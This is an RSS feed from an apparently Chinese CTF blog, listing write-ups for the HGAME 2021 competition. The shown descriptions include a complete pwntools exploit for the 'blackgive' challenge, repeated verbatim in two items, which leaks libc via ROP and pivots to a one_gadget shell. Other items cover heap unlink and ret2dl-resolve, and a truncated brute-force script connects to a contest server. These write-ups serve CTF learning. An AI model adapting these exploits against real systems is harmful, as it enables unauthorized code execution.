<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hctf-Game on blog of chuj</title><link>https://chujdk.github.io/tags/hctf-game.html</link><description>Recent content in Hctf-Game on blog of chuj</description><generator>Hugo</generator><language>zh-cn</language><managingEditor>chujj31@gmail.com (chuj)</managingEditor><webMaster>chujj31@gmail.com (chuj)</webMaster><copyright>© chuj</copyright><lastBuildDate>Sat, 13 Mar 2021 23:01:00 +0000</lastBuildDate><atom:link href="https://chujdk.github.io/tags/hctf-game/index.xml" rel="self" type="application/rss+xml"/><item><title>HgameFINAL-nohook-WP</title><link>https://chujdk.github.io/wp/1183.html</link><pubDate>Sat, 13 Mar 2021 23:01:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1183.html</guid><description>&lt;p&gt;Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hgame 到这里也正式结束了，总结就不写了。&lt;/p&gt;</description></item><item><title>HGAME2021-WEEK4-PWN-WP</title><link>https://chujdk.github.io/wp/1108.html</link><pubDate>Sun, 28 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1108.html</guid><description>&lt;p&gt;hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。&lt;/p&gt;
&lt;h3 id="house_of_cosmos"&gt;house_of_cosmos&lt;/h3&gt;
&lt;p&gt;漏洞点看了很久才看出来&lt;/p&gt;
&lt;div style="text-align:center"&gt;&lt;img src="https://chujdk.github.io/usr/uploads/2021/02/1322405410.png
"&gt;&lt;/div&gt;
&lt;p&gt;读入函数这里的 &lt;code&gt;i&lt;/code&gt; 是 &lt;code&gt;unsigned int&lt;/code&gt;，所以当 &lt;code&gt;a2 &amp;lt;= 0&lt;/code&gt; 时，就可以输入几乎无限的字符，轻松实现堆溢出。由于没有提供 &lt;code&gt;show&lt;/code&gt; 的功能，像前两周那样通过 &lt;code&gt;Unsorted Bin&lt;/code&gt; 来 leak 的方法就比较难了。但是既然可以堆溢出，又有指向堆块的指针，我们就可以朴素地用 &lt;code&gt;unlink&lt;/code&gt; 来实现利用。&lt;/p&gt;</description></item><item><title>HGAME-WEEK3-WP</title><link>https://chujdk.github.io/wp/1100.html</link><pubDate>Sun, 21 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1100.html</guid><description>&lt;h2 id="pwn"&gt;pwn&lt;/h2&gt;
&lt;h3 id="blackgive"&gt;blackgive&lt;/h3&gt;
&lt;p&gt;栈迁移，不要想复杂了&lt;/p&gt;
&lt;h4 id="exp"&gt;exp&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;# coding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;from&lt;/span&gt; &lt;span style="color:#0e84b5;font-weight:bold"&gt;pwn&lt;/span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;import&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;context(log_level &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;context&lt;span style="color:#666"&gt;.&lt;/span&gt;terminal &lt;span style="color:#666"&gt;=&lt;/span&gt; [&lt;span style="color:#4070a0"&gt;&amp;#39;tmux&amp;#39;&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;splitw&amp;#39;&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;-h&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh &lt;span style="color:#666"&gt;=&lt;/span&gt; process(&lt;span style="color:#4070a0"&gt;&amp;#34;./blackgive&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;#sh = remote(&amp;#34;&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;libc &lt;span style="color:#666"&gt;=&lt;/span&gt; ELF(&lt;span style="color:#4070a0"&gt;&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;elf &lt;span style="color:#666"&gt;=&lt;/span&gt; ELF(&lt;span style="color:#4070a0"&gt;&amp;#34;./blackgive&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pop_rdi_ret &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x400813&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;bss_base &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x6010A0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;off &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#40a070"&gt;0xA0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;paSsw0rd&amp;#39;&lt;/span&gt;&lt;span style="color:#666"&gt;.&lt;/span&gt;ljust(&lt;span style="color:#40a070"&gt;0x20&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\x00&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;+=&lt;/span&gt; p64(bss_base &lt;span style="color:#666"&gt;+&lt;/span&gt; off &lt;span style="color:#666"&gt;-&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x8&lt;/span&gt;) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(&lt;span style="color:#40a070"&gt;0x4007A3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#34;password:&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;#gdb.attach(proc.pidof(sh)[0])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;send(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\x00&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt; off &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(pop_rdi_ret) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(elf&lt;span style="color:#666"&gt;.&lt;/span&gt;got[&lt;span style="color:#4070a0"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(elf&lt;span style="color:#666"&gt;.&lt;/span&gt;sym[&lt;span style="color:#4070a0"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(&lt;span style="color:#40a070"&gt;0x40070a&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendlineafter(&lt;span style="color:#4070a0"&gt;&amp;#34;!&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;,payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;puts_addr &lt;span style="color:#666"&gt;=&lt;/span&gt; u64(sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;,drop &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;True&lt;/span&gt;)&lt;span style="color:#666"&gt;.&lt;/span&gt;ljust(&lt;span style="color:#40a070"&gt;8&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\x00&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;libc_base &lt;span style="color:#666"&gt;=&lt;/span&gt; puts_addr &lt;span style="color:#666"&gt;-&lt;/span&gt; libc&lt;span style="color:#666"&gt;.&lt;/span&gt;sym[&lt;span style="color:#4070a0"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;paSsw0rd&amp;#39;&lt;/span&gt;&lt;span style="color:#666"&gt;.&lt;/span&gt;ljust(&lt;span style="color:#40a070"&gt;0x20&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\x00&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;+=&lt;/span&gt; p64(&lt;span style="color:#40a070"&gt;0&lt;/span&gt;) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(libc_base &lt;span style="color:#666"&gt;+&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x4f432&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendafter(&lt;span style="color:#4070a0"&gt;&amp;#34;password:&amp;#34;&lt;/span&gt;,payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="without_leak"&gt;without_leak&lt;/h3&gt;
&lt;p&gt;64 位 &lt;code&gt;ret2dl-resolve&lt;/code&gt; 裸题。由于输出流都被关闭，所以无法实现 leak，考虑进行 &lt;code&gt;ret2dl-resolve&lt;/code&gt;。由于提供了 &lt;code&gt;libc&lt;/code&gt;，考虑通过伪造 &lt;code&gt;link_map&lt;/code&gt; 结构体 getshell。打本地的时候，即便打通了也会有&lt;/p&gt;</description></item><item><title>HGAME2021-WEEK3-PWN-WP</title><link>https://chujdk.github.io/wp/1090.html</link><pubDate>Tue, 16 Feb 2021 16:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1090.html</guid><description>&lt;h3 id="blackgive"&gt;blackgive&lt;/h3&gt;
&lt;p&gt;栈迁移&lt;/p&gt;
&lt;h4 id="exp"&gt;exp&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;# coding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;from&lt;/span&gt; &lt;span style="color:#0e84b5;font-weight:bold"&gt;pwn&lt;/span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;import&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;context(log_level &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;context&lt;span style="color:#666"&gt;.&lt;/span&gt;terminal &lt;span style="color:#666"&gt;=&lt;/span&gt; [&lt;span style="color:#4070a0"&gt;&amp;#39;tmux&amp;#39;&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;splitw&amp;#39;&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;-h&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh &lt;span style="color:#666"&gt;=&lt;/span&gt; process(&lt;span style="color:#4070a0"&gt;&amp;#34;./blackgive&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;#sh = remote(&amp;#34;&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;libc &lt;span style="color:#666"&gt;=&lt;/span&gt; ELF(&lt;span style="color:#4070a0"&gt;&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;elf &lt;span style="color:#666"&gt;=&lt;/span&gt; ELF(&lt;span style="color:#4070a0"&gt;&amp;#34;./blackgive&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pop_rdi_ret &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x400813&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;bss_base &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x6010A0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;off &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#40a070"&gt;0xA0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;paSsw0rd&amp;#39;&lt;/span&gt;&lt;span style="color:#666"&gt;.&lt;/span&gt;ljust(&lt;span style="color:#40a070"&gt;0x20&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\x00&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;+=&lt;/span&gt; p64(bss_base &lt;span style="color:#666"&gt;+&lt;/span&gt; off &lt;span style="color:#666"&gt;-&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x8&lt;/span&gt;) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(&lt;span style="color:#40a070"&gt;0x4007A3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#34;password:&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;#gdb.attach(proc.pidof(sh)[0])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;send(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\x00&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt; off &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(pop_rdi_ret) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(elf&lt;span style="color:#666"&gt;.&lt;/span&gt;got[&lt;span style="color:#4070a0"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(elf&lt;span style="color:#666"&gt;.&lt;/span&gt;sym[&lt;span style="color:#4070a0"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(&lt;span style="color:#40a070"&gt;0x40070a&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendlineafter(&lt;span style="color:#4070a0"&gt;&amp;#34;!&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;,payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;puts_addr &lt;span style="color:#666"&gt;=&lt;/span&gt; u64(sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;,drop &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;True&lt;/span&gt;)&lt;span style="color:#666"&gt;.&lt;/span&gt;ljust(&lt;span style="color:#40a070"&gt;8&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\x00&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;libc_base &lt;span style="color:#666"&gt;=&lt;/span&gt; puts_addr &lt;span style="color:#666"&gt;-&lt;/span&gt; libc&lt;span style="color:#666"&gt;.&lt;/span&gt;sym[&lt;span style="color:#4070a0"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;paSsw0rd&amp;#39;&lt;/span&gt;&lt;span style="color:#666"&gt;.&lt;/span&gt;ljust(&lt;span style="color:#40a070"&gt;0x20&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\x00&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#666"&gt;+=&lt;/span&gt; p64(&lt;span style="color:#40a070"&gt;0&lt;/span&gt;) &lt;span style="color:#666"&gt;+&lt;/span&gt; p64(libc_base &lt;span style="color:#666"&gt;+&lt;/span&gt; &lt;span style="color:#40a070"&gt;0x4f432&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendafter(&lt;span style="color:#4070a0"&gt;&amp;#34;password:&amp;#34;&lt;/span&gt;,payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sh&lt;span style="color:#666"&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="without_leak"&gt;without_leak&lt;/h3&gt;
&lt;p&gt;64 位 &lt;code&gt;ret2dl-resolve&lt;/code&gt; 裸题。由于输出流都被关闭，所以无法实现 leak，考虑进行 &lt;code&gt;ret2dl-resolve&lt;/code&gt;。由于提供了 &lt;code&gt;libc&lt;/code&gt;，考虑通过伪造 &lt;code&gt;link_map&lt;/code&gt; 结构体 getshell。打本地的时候，即便打通了也会有&lt;/p&gt;</description></item><item><title>HGAME-WEEK2-WP</title><link>https://chujdk.github.io/wp/1078.html</link><pubDate>Sun, 14 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1078.html</guid><description>&lt;h2 id="re"&gt;RE&lt;/h2&gt;
&lt;h3 id="fake_debugger-beta"&gt;fake_debugger beta&lt;/h3&gt;
&lt;p&gt;没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;# coding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;from&lt;/span&gt; &lt;span style="color:#0e84b5;font-weight:bold"&gt;pwn&lt;/span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;import&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#60a0b0;font-style:italic"&gt;#context(log_level = &amp;#39;debug&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;total_char &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#4070a0"&gt;&amp;#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.&amp;gt;,&amp;lt;:;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\&amp;#34;\&amp;#39;\\&lt;/span&gt;&lt;span style="color:#4070a0"&gt;`~!@#$%^&amp;amp;*()&lt;/span&gt;&lt;span style="color:#70a0d0"&gt;{}&lt;/span&gt;&lt;span style="color:#4070a0"&gt;[]&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#007020;font-weight:bold"&gt;def&lt;/span&gt; &lt;span style="color:#06287e"&gt;test&lt;/span&gt;(flag_now):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh &lt;span style="color:#666"&gt;=&lt;/span&gt; remote(&lt;span style="color:#4070a0"&gt;&amp;#34;101.132.177.131&amp;#34;&lt;/span&gt;,&lt;span style="color:#40a070"&gt;9999&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#666"&gt;=&lt;/span&gt; flag_now
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendlineafter(&lt;span style="color:#4070a0"&gt;&amp;#34;now!&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;,payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;for&lt;/span&gt; i &lt;span style="color:#007020;font-weight:bold"&gt;in&lt;/span&gt; &lt;span style="color:#007020"&gt;range&lt;/span&gt;(&lt;span style="color:#40a070"&gt;2&lt;/span&gt; &lt;span style="color:#666"&gt;*&lt;/span&gt; &lt;span style="color:#007020"&gt;len&lt;/span&gt;(flag_now)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;sendlineafter(&lt;span style="color:#4070a0"&gt;&amp;#34;---&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;,&lt;span style="color:#4070a0"&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#39;eax: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; code &lt;span style="color:#666"&gt;=&lt;/span&gt; &lt;span style="color:#007020"&gt;int&lt;/span&gt;(sh&lt;span style="color:#666"&gt;.&lt;/span&gt;recvuntil(&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#4070a0;font-weight:bold"&gt;\n&lt;/span&gt;&lt;span style="color:#4070a0"&gt;&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sh&lt;span style="color:#666"&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#007020;font-weight:bold"&gt;return&lt;/span&gt; code
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
